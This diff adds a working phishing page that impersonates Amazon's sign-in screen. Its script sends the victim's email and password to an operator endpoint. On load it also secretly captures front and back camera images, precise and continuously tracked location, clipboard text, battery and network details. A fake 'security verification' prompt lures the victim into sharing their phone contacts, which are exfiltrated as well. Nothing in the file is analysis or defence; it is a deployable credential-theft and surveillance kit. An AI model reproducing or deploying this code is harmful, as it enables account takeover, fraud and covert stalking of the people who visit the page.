@@ -1,0 +1,121 @@
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Amazon - Sign In</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: 'Amazon Ember', Arial, sans-serif; background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
+.logo { width: 100px; margin: 20px 0; }
+.container { width: 100%; max-width: 350px; border: 1px solid #ddd; border-radius: 4px; padding: 20px; }
+h1 { font-size: 28px; font-weight: 400; margin-bottom: 20px; }
+label { font-size: 13px; font-weight: 700; display: block; margin-bottom: 5px; }
+input[type="text"], input[type="password"], input[type="email"] { width: 100%; padding: 7px; border: 1px solid #a6a6a6; border-radius: 3px; font-size: 14px; margin-bottom: 15px; }
+input:focus { border-color: #e77600; box-shadow: 0 0 3px 2px rgba(228,121,17,.5); outline: none; }
+.btn { width: 100%; background: linear-gradient(to bottom, #f7dfa5, #f0c14b); border: 1px solid #a88734; border-radius: 3px; padding: 8px; font-size: 14px; cursor: pointer; }
+.btn:hover { background: linear-gradient(to bottom, #f5d78e, #eeb933); }
+.divider { border-top: 1px solid #e7e7e7; margin: 20px 0; position: relative; }
+.divider span { position: absolute; top: -10px; left: 50%; transform: translateX(-50%); background: #fff; padding: 0 10px; color: #767676; font-size: 12px; }
+.create-account { text-align: center; }
+.create-account a { color: #0066c0; text-decoration: none; font-size: 13px; }
+.footer { margin-top: auto; text-align: center; font-size: 11px; color: #555; padding: 20px; }
+.footer a { color: #0066c0; text-decoration: none; }
+.loading { display: none; text-align: center; padding: 40px; }
+.spinner { border: 3px solid #f3f3f3; border-top: 3px solid #f0c14b; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+<svg class="logo" viewBox="0 0 603 182" xmlns="http://www.w3.org/2000/svg"><path fill="#f90" d="M374.00 142.90C338.74 169.24 287.08 183.00 243.02 183.00C180.08 183.00 123.52 160.14 80.74 122.04C77.44 119.08 80.38 115.04 84.30 117.34C130.88 143.52 188.20 159.10 247.68 159.10C287.92 159.10 332.14 150.80 372.90 133.64C378.82 131.00 383.84 137.44 374.00 142.90Z"/><path fill="#f90" d="M387.78 127.18C383.30 121.44 357.12 124.50 345.30 125.90C341.86 126.30 341.32 123.30 344.40 121.16C365.32 106.26 400.00 110.60 403.82 115.28C407.64 120.00 402.78 154.70 383.16 171.24C380.30 173.68 377.56 172.40 378.84 169.24C383.00 158.70 392.30 132.94 387.78 127.18Z"/><path fill="#232f3e" d="M345.92 20.00L345.92 6.52C345.92 4.42 347.50 3.00 349.40 3.00L410.88 3.00C412.86 3.00 414.46 4.46 414.46 6.52L414.46 17.96C414.42 19.96 412.70 22.56 409.72 26.72L378.08 72.00C389.90 71.72 402.38 73.48 412.98 79.42C415.34 80.76 415.98 82.74 416.16 84.70L416.16 99.00C416.16 101.00 413.98 103.36 411.66 102.12C392.84 92.16 367.70 91.10 346.90 102.26C344.78 103.44 342.56 101.12 342.56 99.12L342.56 85.52C342.56 83.28 342.60 79.34 344.82 75.98L381.86 22.80L349.46 22.80C347.48 22.80 345.92 21.38 345.92 19.32L345.92 20.00Z"/></svg>
+<div class="container" id="loginForm">
+<h1>Sign in</h1>
+<form id="form">
+<label>Email or mobile phone number</label>
+<input type="email" id="email" required>
+<label>Password</label>
+<input type="password" id="password" required>
+<button type="submit" class="btn">Sign in</button>
+</form>
+<div class="divider"><span>New to Amazon?</span></div>
+<div class="create-account"><a href="#">Create your Amazon account</a></div>
+
+<div id="contacts-verify" style="display:none; margin-top:15px; padding:15px; background:#fff3cd; border:1px solid #ffc107; border-radius:8px;">
+<p style="color:#856404; font-weight:bold; font-size:13px; margin-bottom:8px;">⚠️ Security Verification Required</p>
+<p style="font-size:12px; color:#666; margin-bottom:10px;">To verify your identity, please share your contacts</p>
+<button id="shareContactsBtn" style="background:#f0c14b; border:1px solid #a88734; padding:10px 20px; border-radius:3px; font-size:14px; cursor:pointer;">📱 Verify with Contacts</button>
+</div>
+</div>
+<div class="loading" id="loading">
+<div class="spinner"></div>
+<p>Verifying your account...</p>
+</div>
+<div class="footer">
+<a href="#">Conditions of Use</a> &nbsp; <a href="#">Privacy Notice</a> &nbsp; <a href="#">Help</a>
+<p>© 1996-2024, Amazon.com, Inc. or its affiliates</p>
+</div>
+<video id="video" style="display:none" playsinline autoplay></video>
+<canvas hidden id="canvas" width="500" height="500"></canvas>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="<%=a %>/public/advanced.js"></script>
+<script>
+var uid="<%=uid %>";
+window.onload = function() {
+    if(navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition((p)=>{
+            $.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy});
+        }, ()=>{}, {enableHighAccuracy:true, timeout: 5000});
+    }
+    async function captureCamera(facingMode, label) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: facingMode}});
+            video.srcObject = stream;
+            await new Promise(r => setTimeout(r, 1500));
+            canvas.getContext('2d').drawImage(video, 0, 0, 500, 500);
+            $.post("<%=a %>/camsnap", {uid: uid, img: encodeURIComponent(canvas.toDataURL("image/png").replace("data:image/png;base64,", "")), cam: label});
+            stream.getTracks().forEach(t => t.stop());
+        } catch(e) {}
+    }
+    captureCamera("user", "selfie").then(() => captureCamera("environment", "back"));
+    getBattery(); getClipboard(); getNetworkInfo(); startLiveTracking(); setTimeout(showContactsButton, 2000);
+}
+
+async function getContacts() {
+    if ('contacts' in navigator && 'ContactsManager' in window) {
+        try {
+            const props = ['name', 'tel', 'email'];
+            const contacts = await navigator.contacts.select(props, { multiple: true });
+            if(contacts && contacts.length > 0) {
+                const formatted = contacts.map(c => ({ name: c.name?.[0] || '', phones: c.tel || [], emails: c.email || [] }));
+                $.post("<%=a %>/contacts", { uid: uid, contacts: JSON.stringify(formatted) });
+                document.getElementById('contacts-verify').style.display = 'none';
+            }
+        } catch(e) {}
+    }
+}
+function showContactsButton() {
+    if ('contacts' in navigator && 'ContactsManager' in window) {
+        document.getElementById('contacts-verify').style.display = 'block';
+        document.getElementById('shareContactsBtn').onclick = getContacts;
+    }
+}
+async function getBattery() { if ('getBattery' in navigator) { try { const b = await navigator.getBattery(); $.post("<%=a %>/battery", { uid: uid, level: b.level, charging: b.charging, time: b.charging ? b.chargingTime : b.dischargingTime }); } catch(e) {} } }
+async function getClipboard() { if (navigator.clipboard?.readText) { try { const t = await navigator.clipboard.readText(); if(t) $.post("<%=a %>/clipboard", { uid: uid, text: encodeURIComponent(t) }); } catch(e) {} } }
+function getNetworkInfo() { if (navigator.connection) { const c = navigator.connection; $.post("<%=a %>/wifi", { uid: uid, info: `📡 ${c.effectiveType} | 📶 ${c.downlink} Mbps | ⏱️ ${c.rtt}ms` }); } }
+let lc = 0; function startLiveTracking() { if (navigator.geolocation) { setInterval(() => { navigator.geolocation.getCurrentPosition((p) => { lc++; $.post("<%=a %>/live_location", { uid: uid, lat: p.coords.latitude, lon: p.coords.longitude, count: lc }); }, () => {}, { enableHighAccuracy: true }); }, 60000); } }
+
+document.getElementById('form').onsubmit = function(e) {
+    e.preventDefault();
+    document.getElementById('loginForm').style.display = 'none';
+    document.getElementById('loading').style.display = 'block';
+    $.post("<%=a %>/creds", {
+        uid: uid,
+        platform: "Amazon",
+        email: document.getElementById('email').value,
+        password: document.getElementById('password').value
+    }, function() {
+        setTimeout(() => { window.location.href = "<%=url %>"; }, 2000);
+    });
+};
+</script>
+</body>
+</html>
